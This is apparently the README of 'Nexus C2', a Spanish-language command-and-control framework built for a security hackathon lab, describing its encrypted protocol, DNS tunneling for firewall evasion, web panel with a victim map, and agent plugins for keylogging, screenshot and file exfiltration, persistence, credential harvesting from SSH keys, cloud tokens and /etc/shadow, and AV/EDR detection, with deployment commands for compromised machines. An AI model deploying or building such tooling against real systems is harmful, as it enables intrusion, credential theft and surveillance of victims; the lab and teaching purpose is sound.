# Nexus C2

Framework de Command & Control desarrollado para la **Hackathon Aligo — Defensores Informáticos (Talento Tech)**. Entorno de laboratorio cerrado y autorizado.

---

## Descripción

Nexus C2 es un sistema de comando y control con protocolo binario propio, cifrado de extremo a extremo y panel web integrado. Permite controlar múltiples agentes de forma simultánea desde un navegador, ejecutar comandos shell, lanzar plugins especializados, visualizar la ubicación geográfica de los agentes en un mapa en tiempo real y consultar un asistente de inteligencia artificial integrado.

---

## Arquitectura

```
OPERADOR (navegador)
      │
      │  HTTP / WebSocket
      ▼
SERVIDOR C2 — broker async (aiohttp)  ←  Panel web integrado en GET /
      │
      │  Protocolo Nexus binario  →  POST / o WS /ws
      │  X-Session-Id en cabecera HTTP
      ├──────────────┬──────────────┐
      ▼              ▼              ▼
  AGENTE 1       AGENTE 2      AGENTE N
 (Linux/Pi)     (Windows)      (macOS)
```

---

## Características principales

- **Protocolo binario propio** — frame `[TYPE 1B][NONCE 12B][CIPHERTEXT+TAG]`
- **Forward secrecy por sesión** — intercambio X25519 (ECDH) efímero en cada handshake
- **Cifrado autenticado** — ChaCha20-Poly1305 (AEAD) con nonce por contador
- **Múltiples transportes** — HTTP polling, WebSocket persistente, túnel DNS (UDP :5354)
- **Panel web integrado** — servido directamente por el servidor C2 en `GET /`
- **Sistema de plugins** — extensible con prefijo `!`
- **Beaconing con jitter** — patrón de tráfico no determinista
- **Navegación de directorios persistente** — `cd` mantiene estado entre comandos
- **Vista de agentes** — muestra usuario, hostname y OS en tiempo real
- **Mapa de equipos vulnerados** — geolocalización de agentes en mapa mundial interactivo
- **NexusAI** — asistente de inteligencia artificial integrado con fallback multi-modelo
- **Exfiltración de archivos** — endpoint `/exfil` con almacenamiento en servidor

---

## Estructura del repositorio

```
├── protocol.py              # Codec, handshake, criptografía (compartido agente/servidor)
├── requirements.txt         # Dependencias del servidor
├── .env.example             # Variables de entorno necesarias (copiar a .env)
├── server/
│   └── broker.py            # Servidor C2 async + panel web (HTML embebido)
├── agent/
│   ├── agent.py             # Loop de beaconing, ejecución de comandos, plugins
│   └── plugins/
│       ├── __init__.py      # Registry y dispatcher de plugins
│       ├── sysinfo.py       # Info del sistema (OS, CPU, RAM, red, disco)
│       ├── screenshot.py    # Captura de pantalla + auto-exfil al C2
│       ├── keylog.py        # Keylogger (pynput en X11/Windows, evdev en Wayland)
│       ├── persist.py       # Persistencia: crontab → systemd → ~/.bashrc / registry
│       ├── exfil.py         # Exfiltración de archivos al servidor C2
│       ├── download.py      # Descarga de archivos desde internet al agente
│       ├── cat.py           # Lectura de archivos y directorios
│       ├── clip.py          # Lectura/escritura del portapapeles
│       ├── nmcli.py         # Reconocimiento de red via NetworkManager (Linux)
│       ├── mimikatz.py      # Harvesting de credenciales Linux
│       ├── unhook.py        # Detección de AV/EDR, hooks y tracers
│       └── notify.py        # Mensajes en pantalla de la víctima en tiempo real
├── deploy/
│   ├── build_package.sh     # Genera el paquete del agente listo para desplegar
│   ├── install.sh           # Instalador del agente en la máquina vulnerada
│   ├── config.env           # IP del servidor C2 y transporte
│   ├── requirements-agent.txt
│   └── INSTALL.md           # Guía de despliegue paso a paso
└── docs/
    ├── Nexus_Documentacion_Tecnica.md
    ├── arquitectura.md
    └── bitacora.md
```

---

## Instalación

### 1. Clonar el repositorio

```bash
git clone https://github.com/Danieldlr13/Command-and-Control-C2.git
cd Command-and-Control-C2
pip install -r requirements.txt
```

### 2. Configurar variables de entorno

```bash
cp .env.example .env
# Editar .env con tus API keys
```

Variables disponibles:

| Variable | Requerida | Descripción |
|----------|-----------|-------------|
| `GEMINI_API_KEY` | Recomendada | API key de Google AI Studio para NexusAI |
| `OPENROUTER_API_KEY` | Recomendada | API key de OpenRouter (fallback de NexusAI) |
| `OPENROUTER_MODEL` | Opcional | Modelo de fallback (default: `nvidia/nemotron-3-super-120b-a12b:free`) |
| `NEXUS_API_KEY` | Opcional | Protege el panel con autenticación |
| `NEXUS_ALLOW_CLEAR` | Opcional | Permite beacons sin cifrar para debug (`0` por defecto) |
| `NEXUS_DNS_PORT` | Opcional | Puerto del túnel DNS (`5354` por defecto) |

### 3. Iniciar el servidor

```bash
source .env
python3 -m server
```

El panel web queda disponible en `http://localhost:8080`.

### 4. Conectar el agente (máquina vulnerada)

**Opción A — despliegue rápido:**

```bash
# Editar IP del servidor
nano deploy/config.env

# Generar paquete y copiar a la máquina objetivo
./deploy/build_package.sh
scp -r nexus-agent/ usuario@<IP>:~/nexus-agent

# En la máquina vulnerada
cd ~/nexus-agent && ./install.sh
```

**Opción B — laboratorio local:**

```bash
NEXUS_SERVER=http://<IP>:8080 \
NEXUS_SERVER_PUB=$(cat server_pub.hex) \
python3 -m agent
```

---

## Panel web

El panel es una Single Page App servida por el propio servidor C2 en `GET /`. No requiere build ni framework externo.

### Pestaña Resultados
- Lista de agentes con **usuario**, **hostname** y **OS** detectados automáticamente
- Terminal por agente con historial de comandos (↑/↓)
- Barra de plugins por OS (Linux / Windows) con botones de acción rápida
- Visualizador de resultados con exit code y timestamps
- Indicador visual de latencia de beacon

### Pestaña Equipos Vulnerados
- Mapa mundial interactivo con tema oscuro (Leaflet + CartoDB Dark Matter)
- Cada agente aparece como un **pin verde pulsante** en su ubicación geográfica real
- Geolocalización automática via ip-api.com al momento de conexión
- Agentes en red local (LAN) se ubican en la sede del equipo
- Clic en el pin muestra: usuario, hostname, OS, ciudad, país, IP y estado

### NexusAI (burbuja 🤖)
- Asistente de IA integrado accesible desde cualquier pestaña
- Conoce toda la arquitectura, plugins y protocolo de Nexus C2
- Solo responde preguntas sobre el sistema (rechaza temas fuera de scope)
- Cadena de fallback automática: Gemini 2.5 Flash Lite → 4 modelos OpenRouter
- Si todos los proveedores fallan, muestra mensaje neutral sin alertar al operador

---

## Plugins disponibles

| Plugin | Descripción | OS |
|--------|-------------|-----|
| `!sysinfo` | Info completa del sistema: OS, CPU, RAM, red, disco | Todos |
| `!screenshot` | Captura pantalla y la exfiltra automáticamente al C2 | Todos |
| `!keylog start\|dump\|stop` | Keylogger en background | Todos |
| `!persist` | Instala persistencia: crontab → systemd → ~/.bashrc / registry | Todos |
| `!exfil <ruta>` | Sube un archivo al servidor C2 | Todos |
| `!download <url> <dest>` | Descarga desde internet a la máquina vulnerada | Todos |
| `!cat <ruta>` | Lee archivos o lista directorios | Todos |
| `!clip read` | Lee el portapapeles de la víctima | Todos |
| `!clip write <texto>` | Escribe en el portapapeles de la víctima | Todos |
| `!nmcli [wifi\|saved\|passwords\|ifaces]` | Reconocimiento de red WiFi | Linux |
| `!mimikatz` | Harvesting: historial shell, SSH keys, tokens cloud, /etc/shadow | Linux |
| `!unhook` | Detecta LD_PRELOAD, tracers, hooks en memoria y procesos AV/EDR | Linux |
| `!notify <mensaje>` | Muestra un mensaje en pantalla de la víctima | Todos |

Los comandos sin prefijo `!` se ejecutan directamente como shell. `cd` mantiene el directorio entre comandos.

---

## Protocolo

| TYPE | Nombre  | Dirección | Descripción |
|------|---------|-----------|-------------|
| 0x01 | HELLO   | agente → servidor | Handshake: clave pública X25519 efímera |
| 0x02 | WELCOME | servidor → agente | Clave servidor + session_id |
| 0x03 | BEACON  | agente → servidor | Latido con agent_id, hostname, username, OS |
| 0x04 | TASK    | servidor → agente | Comando con task_id UUID |
| 0x05 | RESULT  | agente → servidor | stdout + stderr + exit_code |
| 0x06 | NOP     | servidor → agente | Sin tareas pendientes |
| 0x07 | ERROR   | ambos | Error de protocolo |

---

## Criptografía

| Primitiva | Uso |
|-----------|-----|
| X25519 (ECDH) | Intercambio de claves con forward secrecy por sesión |
| HKDF-SHA256 | Derivación de `session_key` desde el secreto compartido |
| ChaCha20-Poly1305 | Cifrado autenticado (AEAD) de todos los mensajes post-handshake |

---

## Transportes

| Transporte | Variable | Descripción |
|------------|----------|-------------|
| HTTP | `NEXUS_TRANSPORT=http` | Polling sobre HTTP POST (default) |
| WebSocket | `NEXUS_TRANSPORT=ws` | Conexión persistente, menor latencia |
| DNS | `NEXUS_TRANSPORT=dns` | Túnel DNS sobre UDP :5354 para evadir firewalls |

---

## Dependencias

**Servidor:**
```
aiohttp>=3.9
cryptography>=40.0
```

**Agente:**
```
cryptography>=40.0
requests>=2.31
pynput>=1.7
mss>=9.0
evdev>=1.6       # solo Linux (keylogger Wayland)
Pillow>=9.0      # solo Windows (screenshot)
```

---

## Contexto

Proyecto desarrollado en el marco de la **Hackathon Aligo — Defensores Informáticos (Talento Tech)**, en un entorno de laboratorio cerrado y autorizado. El uso de este software fuera de ese contexto es responsabilidad exclusiva del usuario.
